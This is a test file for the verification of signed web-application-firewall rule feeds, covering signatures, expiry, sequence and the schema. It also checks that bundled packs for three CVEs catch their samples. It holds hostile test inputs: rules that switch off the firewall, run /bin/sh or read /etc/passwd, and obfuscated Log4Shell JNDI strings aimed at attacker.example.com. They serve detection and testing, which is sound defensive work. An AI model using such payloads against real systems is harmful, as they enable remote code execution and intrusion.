/**
 * Verifying a rule feed (ee/rule-feed/feed.ts): the signature over the feed's
 * own context and a trusted key id, expiry, the sequence that never goes
 * back, size limits, the schema, and a feed refused whole when one rule of
 * one pack breaks the allowlist. Also the example packs: valid, and their
 * samples agree with their rules.
 */
import { sign } from 'node:crypto';
import { describe, expect, it } from 'vitest';
import { checkFeedSequence, feedDocument, feedSigningInput, RuleFeedError, verifyRuleFeed } from '@/ee/rule-feed/feed';
import { checkPackSamples, packMatchesSample } from '@/ee/rule-feed/sample-check';
import { validatePackRules } from '@/ee/rule-feed/seclang';
import { signingInput as licenseSigningInput } from '@/ee/licensing/license';
import { createFeedSigner, examplePacks, FEED_NOW, feedPayload, signFeed, testPack } from '../helpers/rule-feed';

const signer = createFeedSigner();

function refusal(document: string, now = FEED_NOW, keys = signer.keys): string {
  try {
    verifyRuleFeed(document, keys, now);
  } catch (error) {
    expect(error).toBeInstanceOf(RuleFeedError);
    return (error as Error).message;
  }
  throw new Error('the feed was accepted');
}

describe('feed signature', () => {
  it('accepts a feed signed by a trusted key and returns its packs and digest', () => {
    const feed = verifyRuleFeed(signFeed(signer, feedPayload(signer)), signer.keys, FEED_NOW);
    expect(feed.payload).toMatchObject({ kid: signer.kid, sequence: 100, packs: [{ id: 'ivp-test-0001' }] });
    expect(feed.packs[0].validated.ruleIds).toEqual([1800000001]);
    expect(feed.digest).toMatch(/^[0-9a-f]{64}$/);
  });

  it('refuses a payload changed after signing', () => {
    const document = JSON.parse(signFeed(signer, feedPayload(signer)));
    const tampered = feedPayload(signer, { packs: [testPack({ rules: ['SecRule ARGS "@rx ." "id:1800000001,phase:1"'] })] });
    document.payload = Buffer.from(JSON.stringify(tampered)).toString('base64url');
    expect(refusal(JSON.stringify(document))).toMatch(/signature does not match/);
  });

  it('refuses unknown keys, other keys and signatures made for another context', () => {
    const other = createFeedSigner(signer.kid);
    expect(refusal(signFeed(other, feedPayload(other)))).toMatch(/signature does not match/);
    const stranger = createFeedSigner('another-key');
    expect(refusal(signFeed(stranger, feedPayload(stranger)))).toMatch(/unknown key \(another-key\)/);
    // A license signature over the same bytes is not a feed signature.
    const payloadPart = Buffer.from(JSON.stringify(feedPayload(signer))).toString('base64url');
    expect(refusal(feedDocument(payloadPart, sign(null, licenseSigningInput(payloadPart), signer.privateKey)))).toMatch(/signature does not match/);
    expect(refusal(feedDocument(payloadPart, sign(null, Buffer.from(payloadPart), signer.privateKey)))).toMatch(/signature does not match/);
    expect(feedSigningInput('x').toString()).toBe('ingressi-rule-feed:v1.x');
  });

  it('refuses malformed documents', () => {
    expect(refusal('')).toMatch(/empty/);
    expect(refusal('not json')).toMatch(/not JSON/);
    expect(refusal('[]')).toMatch(/not a feed document/);
    expect(refusal(JSON.stringify({ v: 2, payload: 'a', signature: 'b' }))).toMatch(/newer version/);
    expect(refusal(JSON.stringify({ v: 1, payload: 'a b', signature: 'b' }))).toMatch(/not base64url/);
    expect(refusal(JSON.stringify({ v: 1, payload: 'YQ', signature: 'YQ', extra: 1 }))).toMatch(/unknown field "extra"/);
    const document = JSON.parse(signFeed(signer, feedPayload(signer)));
    document.signature = document.signature.slice(0, 20);
    expect(refusal(JSON.stringify(document))).toMatch(/signature does not match/);
  });

  it('refuses a feed larger than 4 MiB before parsing it', () => {
    expect(refusal(`{"v":1,"payload":"${'a'.repeat(4 * 1024 * 1024)}","signature":"a"}`)).toMatch(/larger than 4 MiB/);
  });
});

describe('feed dates and sequence', () => {
  it('refuses expired feeds, feeds from the future and over-long validity', () => {
    expect(refusal(signFeed(signer, feedPayload(signer)), new Date('2026-11-01T00:00:00Z'))).toMatch(/expired on 2026-10-31/);
    expect(refusal(signFeed(signer, feedPayload(signer)), new Date('2026-09-29T00:00:00Z'))).toMatch(/issued in the future/);
    expect(refusal(signFeed(signer, feedPayload(signer, { expiresAt: '2027-03-01T00:00:00.000Z' })))).toMatch(/more than 90 days/);
    expect(refusal(signFeed(signer, feedPayload(signer, { expiresAt: '2026-09-01T00:00:00.000Z' })))).toMatch(/expires before it is issued/);
  });

  it('only moves the sequence forward', () => {
    const feed = verifyRuleFeed(signFeed(signer, feedPayload(signer)), signer.keys, FEED_NOW);
    expect(checkFeedSequence(feed, null)).toBe('newer');
    expect(checkFeedSequence(feed, { sequence: 99, digest: 'x' })).toBe('newer');
    expect(checkFeedSequence(feed, { sequence: 100, digest: feed.digest })).toBe('same');
    expect(() => checkFeedSequence(feed, { sequence: 100, digest: 'other' })).toThrow(/installed sequence 100 but different content/);
    expect(() => checkFeedSequence(feed, { sequence: 101, digest: 'x' })).toThrow(/older than the installed one/);
    expect(refusal(signFeed(signer, feedPayload(signer, { sequence: 0 })))).toMatch(/positive integer/);
    expect(refusal(signFeed(signer, feedPayload(signer, { sequence: 1.5 })))).toMatch(/positive integer/);
  });
});

describe('feed content', () => {
  it('refuses the whole feed when one rule of one pack breaks the allowlist', () => {
    const attempts = [
      'SecRuleEngine Off',
      'SecRuleRemoveById 1-999999',
      'SecRule ARGS "@rx ." "id:1800000002,phase:1,ctl:ruleEngine=Off"',
      'SecRule ARGS "@rx ." "id:1800000002,phase:1,ctl:ruleRemoveById=949110"',
      "SecRule ARGS \"@rx .\" \"id:1800000002,phase:1,setvar:'tx.inbound_anomaly_score_threshold=10000'\"",
      'SecRule ARGS "@rx ." "id:1800000002,phase:1,exec:/bin/sh"',
      'SecRule ARGS "@pmFromFile /etc/passwd" "id:1800000002,phase:1"',
      'Include /etc/passwd',
      'SecRule ARGS "@rx ." "id:942100,phase:1"',
    ];
    for (const rule of attempts) {
      const packs = [testPack(), testPack({ id: 'ivp-test-0002', rules: [rule] })];
      expect(refusal(signFeed(signer, feedPayload(signer, { packs }))), rule).toMatch(/^pack ivp-test-0002, rule 1: /);
    }
  });

  it('refuses unknown fields, bad ids, duplicate ids and bad references', () => {
    const payload = (packs: unknown[], extra: Record<string, unknown> = {}) => signFeed(signer, feedPayload(signer, { packs, ...extra }));
    expect(refusal(payload([testPack()], { note: 'x' }))).toMatch(/unknown field "note"/);
    expect(refusal(payload([testPack({ extra: true })]))).toMatch(/unknown field "extra"/);
    expect(refusal(payload([testPack({ id: 'Bad Id' })]))).toMatch(/id must be/);
    expect(refusal(payload([testPack(), testPack()]))).toMatch(/appears twice/);
    expect(refusal(payload([testPack(), testPack({ id: 'ivp-test-0002' })]))).toMatch(/rule id 1800000001 is used by another pack/);
    expect(refusal(payload([testPack({ cves: ['CVE-21-1'] })]))).toMatch(/not a CVE id/);
    expect(refusal(payload([testPack({ references: ['http://example.com/'] })]))).toMatch(/https:\/\/ URLs/);
    expect(refusal(payload([testPack({ references: ['https://user:pw@example.com/'] })]))).toMatch(/without credentials/);
    expect(refusal(payload([testPack({ severity: 'urgent' as never })]))).toMatch(/severity must be/);
    expect(refusal(payload([testPack({ defaultMode: 'on' as never })]))).toMatch(/defaultMode/);
    expect(refusal(payload([testPack({ title: 'two\nlines' })]))).toMatch(/control characters/);
    expect(refusal(payload([testPack({ samples: { positive: [], negative: [] } })]))).toMatch(/at least 1 entry/);
    expect(refusal(payload([testPack({ samples: { positive: [{ method: 'TRACE', path: '/' }], negative: [] } })]))).toMatch(/method/);
    expect(refusal(payload(Array.from({ length: 501 }, (_, i) => testPack({ id: `ivp-test-${i}` }))))).toMatch(/more than 500 packs/);
  });
});

describe('example packs', () => {
  const packs = examplePacks();

  it('ships three real CVEs, marked as examples', () => {
    expect(packs.map((pack) => pack.cves[0]).sort()).toEqual(['CVE-2021-41773', 'CVE-2021-44228', 'CVE-2022-22965']);
    expect(packs.every((pack) => pack.example === true)).toBe(true);
  });

  it('verify as a signed feed', () => {
    const feed = verifyRuleFeed(signFeed(signer, feedPayload(signer, { packs })), signer.keys, FEED_NOW);
    expect(feed.packs.map(({ validated }) => validated.ruleIds).flat().sort()).toEqual([1800000101, 1800000201, 1800000301]);
  });

  it('match their positive samples and let their negative ones through', () => {
    for (const pack of packs) {
      expect(checkPackSamples(pack), pack.id).toEqual({ problems: [], unchecked: [] });
    }
  });

  it('catch common Log4Shell obfuscations and leave template-like text alone', () => {
    const { rules } = validatePackRules(packs.find((pack) => pack.id === 'ivp-2021-44228')!.rules, 'log4shell');
    const header = (value: string) => packMatchesSample(rules, { method: 'GET', path: '/', headers: { 'X-Forwarded-For': value } });
    expect(header('${jndi:rmi://attacker.example.com/a}')).toBe(true);
    expect(header('${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.example.com/a}')).toBe(true);
    expect(header('${${env:NaN:-j}ndi${env:NaN:-:}ldap://attacker.example.com/a}')).toBe(true);
    expect(header('&dollar;&lbrace;jndi:ldap://attacker.example.com/a}')).toBe(true);
    expect(header('${JNDI:LDAP://attacker.example.com/a}')).toBe(true);
    expect(header('Total: ${price} for ${count} items')).toBe(false);
    expect(header('192.0.2.10')).toBe(false);
  });
});
